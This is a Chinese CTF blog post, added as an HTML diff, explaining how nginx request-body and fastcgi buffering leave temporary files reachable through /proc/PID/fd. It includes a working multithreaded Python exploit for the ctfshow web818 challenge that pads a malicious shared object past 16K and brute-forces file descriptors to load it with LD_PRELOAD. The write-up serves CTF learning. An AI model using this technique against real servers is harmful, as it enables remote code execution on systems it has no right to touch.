@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="Xi4nb3i" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      nginx缓存带来的临时文件 
+      
+      
+    
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.svg">
+    <link rel="icon" href="/images/favicon.svg">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Montserrat|Roboto:400,400italic,600|Roboto+Mono" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/css/common.css">
+<link rel="stylesheet" href="/iconfont/iconfont.css">
+
+
+  
+
+  
+    
+<link rel="stylesheet" href="/css/post.css">
+
+  
+
+  <!-- jquery3.3.1 -->
+  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+  <!-- fancybox -->
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
+  
+<script src="/js/fancybox.js"></script>
+
+
+<meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="Xi4nb3i's blog" type="application/atom+xml">
+</head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <a href="/">Xi4nb3i</a>
+</div>
+
+
+      <p class="links">
+  
+    <a title="archives" target="" href="/archives/">
+      <i class="iconfont icon-bookmark"></i>
+    </a>
+  
+    <a title="github" target="_blank" href="https://github.com/xianbeil">
+      <i class="iconfont icon-github"></i>
+    </a>
+  
+</p>
+
+
+      <div class="main">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+<!-- LaTex Display -->
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script type="text/javascript" id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
+</script>
+<script>
+  MathJax = {
+    tex: {
+      inlineMath: [['$', '$'], ['\\(', '\\)']]
+    }
+  };
+</script>
+
+<div class="post">
+  <h3 class="date">
+    May 16, 2022
+  </h3>
+  <h1>
+    nginx缓存带来的临时文件
+  </h1>
+  <div class="content markdown-body">
+    <h1 id="关于文件上传"><a href="#关于文件上传" class="headerlink" title="关于文件上传"></a>关于文件上传</h1><blockquote>
+<p>来自于ctfshow技术分享</p>
+</blockquote>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220515225958-75i1tsg.png" alt="image.png"></p>
+<h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><h2 id="PHP临时文件机制"><a href="#PHP临时文件机制" class="headerlink" title="PHP临时文件机制"></a>PHP临时文件机制</h2><h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h3><p>在PHP中可以使用POST方法或者PUT方法进行文本和二进制文件的上传。上传的文件信息会保存在全局变量$_FILES里。</p>
+<p>$_FILES超级全局变量很特殊，他是预定义超级全局数组中唯一的二维数组。其作用是存储各种与上传文件有关的信息，这些信息对于通过PHP脚本上传到服务器的文件至关重要。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;userfile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] 客户端文件的原名称。</span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;userfile&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] 文件的 MIME 类型，如果浏览器提供该信息的支持，例如<span class="string">&quot;image/gif&quot;</span>。</span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;userfile&#x27;</span>][<span class="string">&#x27;size&#x27;</span>] 已上传文件的大小，单位为字节。</span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;userfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，默认是/tmp目录。</span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;userfile&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] 该文件上传的错误代码，上传成功其值为<span class="number">0</span>，否则为错误信息。</span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;userfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>] 文件被上传后在服务端存储的临时文件名</span><br></pre></td></tr></table></figure>
+
+<p>在临时文件包含漏洞中<code>$_FILES[&#39;userfile&#39;][&#39;name&#39;]</code>这个变量值的获取很重要，因为临时文件的名字都是由随机函数生成的，只有知道文件的名字才能正确的去包含它。</p>
+<h3 id="储存目录"><a href="#储存目录" class="headerlink" title="储存目录"></a>储存目录</h3><p>临时目录由php.ini的<code>upload_tmp_dir</code>属性指定。假如<code>upload_tmp_dir</code>的路径不可写，PHP会上传到系统默认的临时目录中。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Linux:</span><br><span class="line">/tmp/</span><br><span class="line"></span><br><span class="line">Win:</span><br><span class="line">C:/Windows/</span><br><span class="line">C:/Windows/Temp/</span><br></pre></td></tr></table></figure>
+
+<h3 id="命名规则"><a href="#命名规则" class="headerlink" title="命名规则"></a>命名规则</h3><p>Linux临时文件主要存储在<code>/tmp/</code>目录下，格式通常是（<code>/tmp/php[6个随机字符]</code>）</p>
+<p>Windows临时文件主要存储在<code>C:/Windows/</code>目录下，格式通常是（<code>C:/Windows/php[4个随机字符].tmp</code>）</p>
+<h1 id="nginx缓存"><a href="#nginx缓存" class="headerlink" title="nginx缓存"></a>nginx缓存</h1><h2 id="body-buffer"><a href="#body-buffer" class="headerlink" title="body_buffer"></a>body_buffer</h2><p>官方文档：<a target="_blank" rel="noopener" href="http://nginx.org/en/docs/http/ngx_http_core_module.html#client_body_buffer_size">http://nginx.org/en/docs/http/ngx_http_core_module.html#client_body_buffer_size</a></p>
+<p><code>client_body_buffer_size</code>这个参数，也就是nginx关于上传的配置处</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220516190135-d1k6fp6.png" alt="image.png"></p>
+<p>设置读取客户端请求正文的缓冲区大小。 如果请求正文大于缓冲区，则将整个正文或仅其部分写入临时文件。 默认情况下，缓冲区大小等于两个内存页。 这是 x86、其他 32 位平台和 x86-64 上的 8K。 在其他 64 位平台上通常为 16K。</p>
+<p>也就是说当body中数据的大于16k的时候就会有临时文件写入。</p>
+<p><code>client_body_in_file_only</code>，默认是关闭</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220516190740-9c11zzu.png" alt="image.png"></p>
+<p>确定 nginx 是否应将<em>整个客户端请求正文</em>保存到文件中。 该指令可以在调试期间使用，或者在使用 $request_body_file 变量或模块 ngx_http_perl_module 的 $r-&gt;request_body_file 方法时使用。</p>
+<p>当设置为 on 时，临时文件在请求处理后不会被删除。</p>
+<p>值 clean 将导致请求处理后留下的临时文件被删除。</p>
+<p><code>client_body_temp_path</code>，关于临时文件的存放目录</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220516190938-aotwaea.png" alt="image.png"></p>
+<p>定义一个目录，用于存储保存客户端请求正文的临时文件。 指定目录下最多可以使用三级子目录层次结构。 例如，在以下配置中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">client_body_temp_path /spool/nginx/client_temp <span class="number">1</span> <span class="number">2</span>;</span><br></pre></td></tr></table></figure>
+
+<p>临时文件的目录就会像下面这样</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/spool/nginx/client_temp/<span class="number">7</span>/<span class="number">45</span>/<span class="number">00000123457</span></span><br></pre></td></tr></table></figure>
+
+<p>因此当我们的请求body大于16k的时候，他就会生成缓存到上面这个目录，但是马上又删除了，但是他删除以后，又继续进行了修改和访问</p>
+<p>就可以通过&#x2F;proc&#x2F;PID&#x2F;fd&#x2F;{}来访问到这个临时文件</p>
+<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>如果我们的so文件临时膨胀到16k以上，也就是在so文件之后加入垃圾字节，就能够让so文件被存入到临时文件中去。</p>
+<h3 id="例：ctfshow-web818"><a href="#例：ctfshow-web818" class="headerlink" title="例：ctfshow web818"></a>例：ctfshow web818</h3><p>直接学习羽师傅脚本即可，他这里是用socket库来进行网络请求的。</p>
+<p>关键点是31行的恶意字节填充，让hack.so的文件内容写入nginx产生的临时文件</p>
+<p>接着用bruter函数对proc目录进行一个爆破即可，这里的pid题目中会给到，所以只用爆破后面的fd即可</p>
+<p>羽师傅的脚本真的清晰，学习了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">port= <span class="number">28118</span></span><br><span class="line">s=socket.socket()</span><br><span class="line">s.connect((<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,port))</span><br><span class="line">s.send(<span class="string">f&#x27;&#x27;&#x27;GET / HTTP/1.1</span></span><br><span class="line"><span class="string">Host:127.0.0.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	&#x27;&#x27;&#x27;</span>.encode())</span><br><span class="line">data=s.recv(<span class="number">1024</span>).decode()</span><br><span class="line">s.close()</span><br><span class="line">pid = re.findall(<span class="string">&#x27;(.*?) www-data&#x27;</span>,data)[<span class="number">0</span>].strip()</span><br><span class="line"><span class="built_in">print</span>(pid)</span><br><span class="line">l=<span class="built_in">str</span>(<span class="built_in">len</span>(<span class="built_in">open</span>(<span class="string">&#x27;../hack.so&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()+<span class="string">b&#x27;\n&#x27;</span>*<span class="number">1024</span>*<span class="number">200</span>)).encode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		s=socket.socket()</span><br><span class="line">		s.connect((<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,port))</span><br><span class="line">		x=<span class="string">b&#x27;&#x27;&#x27;POST / HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">User-Agent: yu22x</span></span><br><span class="line"><span class="string">Content-Length: &#x27;&#x27;&#x27;</span>+l+<span class="string">b&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>+<span class="built_in">open</span>(<span class="string">&#x27;../hack.so&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()+<span class="string">b&#x27;\n&#x27;</span>*<span class="number">1024</span>*<span class="number">200</span>+<span class="string">b&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">		s.send(x)</span><br><span class="line">		s.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bruter</span>():</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		<span class="keyword">for</span> fd <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">40</span>):</span><br><span class="line">			<span class="built_in">print</span>(fd)</span><br><span class="line">			s=socket.socket()</span><br><span class="line">			s.connect((<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,port))</span><br><span class="line">			s.send(<span class="string">f&#x27;&#x27;&#x27;GET /?env=LD_PRELOAD=/proc/<span class="subst">&#123;pid&#125;</span>/fd/<span class="subst">&#123;fd&#125;</span> HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">User-Agent: yu22x</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.encode())</span><br><span class="line">			<span class="built_in">print</span>(s.recv(<span class="number">2048</span>).decode())</span><br><span class="line">			s.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    t = threading.Thread(target=upload)</span><br><span class="line">    t.start()</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    a = threading.Thread(target=bruter)</span><br><span class="line">    a.start()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="fastcgi-buffer"><a href="#fastcgi-buffer" class="headerlink" title="fastcgi_buffer"></a>fastcgi_buffer</h2><p><a target="_blank" rel="noopener" href="http://nginx.org/en/docs/http/ngx_http_fastcgi_module.html#fastcgi_buffering">http://nginx.org/en/docs/http/ngx_http_fastcgi_module.html#fastcgi_buffering</a></p>
+<p><code>fastcgi_buffers</code></p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220516205014-a325727.png" alt="image.png"></p>
+<p>当启用来自 FastCGI 服务器的响应缓冲时，限制在响应尚未完全读取时可能正忙于向客户端发送响应的缓冲区的总大小。 同时，其余缓冲区可用于读取响应，并在需要时将部分响应缓冲到临时文件。 默认情况下，大小受 fastcgi_buffer_size 和 fastcgi_buffers 指令设置的两个缓冲区的大小限制。</p>
+<p><code>fastcgi_temp_path</code></p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220516205217-kaxreg3.png" alt="image.png"></p>
+<p>a temporary file might look like this:</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/spool/nginx/fastcgi_temp/7/45/00000123457</span><br></pre></td></tr></table></figure>
+
+</blockquote>
+<p>同样对于fastcgi缓存的利用也和上面的body_buffer利用思路一样，只是临时文件保存的目录变了</p>
+
+  </div>
+  
+    
+      <a id="older" class="blog-nav" href="/2022/05/16/ctfshow%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/">OLDER&nbsp;&gt;</a>
+      
+        
+          <a id="newer" class="blog-nav" href="/2022/05/25/dasctf4%E6%9C%88%E8%B5%9B/">&lt;&nbsp;NEWER</a>
+          
+            
+</div>
+        <div class="footer">
+  
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/leedom92/hexo-theme-leedom">Copyright © Leedom 2021</a>
+        
+    </div>
+  
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/leedom92/hexo-theme-leedom">Theme by Leedom | Powered by Hexo</a>
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="back-to-top hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+      
+
+
+    </div>
+  </body>
+</html>
